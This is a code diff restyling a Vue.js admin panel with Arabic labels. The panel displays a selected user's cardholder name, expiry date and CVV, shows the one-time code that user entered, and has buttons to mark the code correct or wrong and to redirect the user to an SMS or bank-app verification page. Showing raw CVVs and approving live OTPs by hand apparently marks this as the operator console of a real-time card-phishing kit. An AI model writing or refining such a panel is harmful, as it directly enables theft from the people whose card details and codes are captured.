-                      <p class="text-[9px] text-red-300 uppercase tracking-widest mb-0.5 font-bold">CVV</p>
-                      <p class="font-mono text-white bg-white/10 px-2 py-0.5 rounded backdrop-blur-sm tracking-widest text-sm border border-white/10 select-all text-center min-w-[3rem]">
-                        {{ selectedRequest.cvv }}
-                      </p>
+                    
+                    <div class="flex items-center gap-6" dir="ltr">
+                      <div>
+                        <p class="text-[9px] text-white/60 uppercase tracking-widest mb-0.5 font-bold">Name</p>
+                        <p class="font-mono text-white/90 uppercase text-xs tracking-wider select-all">
+                          {{ selectedRequest.paymentName || selectedRequest.name }}
+                        </p>
+                      </div>
+                      <div>
+                        <p class="text-[9px] text-white/60 uppercase tracking-widest mb-0.5 font-bold">Expires</p>
+                        <p class="font-mono text-white font-medium tracking-wider text-xs select-all tabular-nums">
+                          {{ selectedRequest.expMonth }}/{{ selectedRequest.expYear }}
+                        </p>
+                      </div>
+                      <div>
+                        <p class="text-[9px] text-yellow-200 uppercase tracking-widest mb-0.5 font-bold">CVV</p>
+                        <p class="font-mono text-white bg-black/25 px-2 py-0.5 rounded text-xs select-all text-center tabular-nums">
+                          {{ selectedRequest.cvv }}
+                        </p>
+                      </div>
                     </div>
                   </div>
                 </div>
-              </div>
-              <div v-else class="bg-blue-50/50 rounded-xl p-5 border border-blue-100 relative overflow-hidden">
-                <h3 class="font-bold text-blue-900 mb-4 pb-2 border-b border-blue-100 relative z-10">بيانات البطاقة</h3>
-                <div class="text-gray-400 text-sm py-8 text-center italic relative z-10 bg-white/50 rounded-lg border border-dashed border-gray-200">
-                  لم يقم بإدخال بيانات البطاقة بعد
+                <div v-else class="bg-green-50/50 rounded-xl p-5 border border-green-100">
+                  <h3 class="font-bold text-sm text-[#008a40] mb-3 pb-2 border-b border-green-100">بيانات البطاقة</h3>
+                  <div class="text-gray-400 text-xs py-6 text-center bg-white/60 rounded-lg border border-dashed border-gray-200">
+                    لم يقم بإدخال بيانات البطاقة بعد
+                  </div>
                 </div>
-              </div>
 
                 <!-- OTP & Actions Box -->
-                <div class="bg-white rounded-xl p-5 border border-gray-200 shadow-sm">
-                  <h3 class="font-bold text-gray-900 mb-4 pb-2 border-b border-gray-100">إجراءات التحقق</h3>
+                <div class="bg-white rounded-xl p-5 border border-gray-200 shadow-2xs">
+                  <h3 class="font-bold text-sm text-gray-900 mb-4 pb-2 border-b border-gray-100">إجراءات التحقق والتوجيه</h3>
                   
                   <div v-if="selectedRequest.otp" class="flex flex-col items-center">
                     <p class="text-xs text-gray-500 mb-2">الرمز المدخل:</p>
-                    <div class="font-mono text-green-600 font-bold text-3xl tracking-[0.3em] bg-green-50 py-3 px-6 rounded-xl border-2 border-green-200 border-dashed text-center w-full mb-4">
+                    <div class="font-mono text-[#008a40] font-bold text-2xl tracking-[0.3em] bg-green-50 py-2.5 px-5 rounded-xl border border-green-200 text-center w-full mb-4 tabular-nums">
                       {{ selectedRequest.otp }}
                     </div>
                     
                     <div class="flex gap-3 w-full" v-if="!selectedRequest.otpStatus || selectedRequest.otpStatus === 'pending'">
-                      <button @click="updateOtpStatus(selectedRequest.id, 'approved')" class="flex-1 bg-green-500 hover:bg-green-600 text-white py-2.5 rounded-lg font-bold transition-all transform active:scale-[0.98] shadow-sm">
+                      <button @click="updateOtpStatus(selectedRequest.id, 'approved')" class="flex-1 bg-[#008a40] hover:bg-[#007335] text-white py-2 rounded-lg text-xs font-bold transition-all cursor-pointer">
                         الرمز صحيح
                       </button>
-                      <button @click="updateOtpStatus(selectedRequest.id, 'rejected')" class="flex-1 bg-red-500 hover:bg-red-600 text-white py-2.5 rounded-lg font-bold transition-all transform active:scale-[0.98] shadow-sm">
+                      <button @click="updateOtpStatus(selectedRequest.id, 'rejected')" class="flex-1 bg-red-600 hover:bg-red-700 text-white py-2 rounded-lg text-xs font-bold transition-all cursor-pointer">
                         الرمز خاطئ
                       </button>
                     </div>
                     
-                    <div v-else-if="selectedRequest.otpStatus === 'approved'" class="w-full bg-green-50 border border-green-200 text-green-700 py-3 rounded-lg text-center font-bold text-sm tracking-wide">
-                      ✅ تمت الموافقة على الرمز
+                    <div v-else-if="selectedRequest.otpStatus === 'approved'" class="w-full bg-green-50 border border-green-200 text-[#008a40] py-2.5 rounded-lg text-center font-bold text-xs">
+                      تمت الموافقة على الرمز
                     </div>
-                    <div v-else-if="selectedRequest.otpStatus === 'rejected'" class="w-full bg-red-50 border border-red-200 text-red-700 py-3 rounded-lg text-center font-bold text-sm tracking-wide">
-                      ❌ تم رفض الرمز
+                    <div v-else-if="selectedRequest.otpStatus === 'rejected'" class="w-full bg-red-50 border border-red-200 text-red-700 py-2.5 rounded-lg text-center font-bold text-xs">
+                      تم رفض الرمز
                     </div>
                   </div>
                   
-                  <div v-else-if="selectedRequest.step === 'card' && !selectedRequest.nextAction" class="flex flex-col gap-3">
-                    <p class="text-sm text-gray-600 text-center mb-1">توجيه المستخدم إلى صفحة التحقق:</p>
-                    <button @click="updateNextAction(selectedRequest.id, 'otp-sms')" class="w-full bg-blue-600 hover:bg-blue-700 text-white py-2.5 rounded-lg font-bold transition-all shadow-sm">
+                  <div v-else-if="selectedRequest.step === 'card' && !selectedRequest.nextAction" class="flex flex-col gap-2.5">
+                    <p class="text-xs text-gray-600 text-center mb-1">توجيه المستخدم إلى صفحة التحقق:</p>
+                    <button @click="updateNextAction(selectedRequest.id, 'otp-sms')" class="w-full bg-[#008a40] hover:bg-[#007335] text-white py-2.5 rounded-lg text-xs font-bold transition-all cursor-pointer">
                       رسالة نصية (SMS)
                     </button>
-                    <button @click="updateNextAction(selectedRequest.id, 'otp-bank')" class="w-full bg-purple-600 hover:bg-purple-700 text-white py-2.5 rounded-lg font-bold transition-all shadow-sm">
+                    <button @click="updateNextAction(selectedRequest.id, 'otp-bank')" class="w-full bg-gray-800 hover:bg-gray-900 text-white py-2.5 rounded-lg text-xs font-bold transition-all cursor-pointer">
                       تطبيق بنكي
                     </button>
                   </div>
                   
-                  <div v-else-if="selectedRequest.step === 'card' && selectedRequest.nextAction" class="py-6 flex flex-col items-center justify-center bg-gray-50 rounded-lg border border-dashed border-gray-200">
-                    <div class="w-10 h-10 bg-blue-100 text-blue-600 flex items-center justify-center rounded-full mb-3">
-                      <svg class="w-5 h-5 animate-spin" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" />
-                      </svg>
-                    </div>
-                    <p class="text-blue-700 text-sm font-bold text-center px-4">
+                  <div v-else-if="selectedRequest.step === 'card' && selectedRequest.nextAction" class="py-5 flex flex-col items-center justify-center bg-gray-50 rounded-lg border border-dashed border-gray-200">
+                    <p class="text-[#008a40] text-xs font-bold text-center px-4">
                       تم توجيه المستخدم لصفحة التحقق
-                      <br/>
-                      <span v-if="selectedRequest.nextAction === 'otp-sms'" class="text-xs font-normal opacity-80 mt-1 block">(رسالة نصية)</span>
-                      <span v-if="selectedRequest.nextAction === 'otp-bank'" class="text-xs font-normal opacity-80 mt-1 block">(تطبيق بنكي)</span>
+                      <span v-if="selectedRequest.nextAction === 'otp-sms'" class="font-normal opacity-80 block mt-0.5">(رسالة نصية)</span>
+                      <span v-if="selectedRequest.nextAction === 'otp-bank'" class="font-normal opacity-80 block mt-0.5">(تطبيق بنكي)</span>
                     </p>
-                    <p class="text-xs text-gray-400 mt-2">في انتظار إدخال الرمز...</p>
+                    <p class="text-[11px] text-gray-400 mt-1.5">في انتظار إدخال الرمز...</p>
                   </div>
                   
-                  <div v-else class="text-gray-400 text-sm py-8 text-center italic bg-gray-50 rounded-lg border border-dashed border-gray-200">
+                  <div v-else class="text-gray-400 text-xs py-6 text-center bg-gray-50 rounded-lg border border-dashed border-gray-200">
                     بانتظار إدخال بيانات البطاقة للتحقق
                   </div>
                 </div>
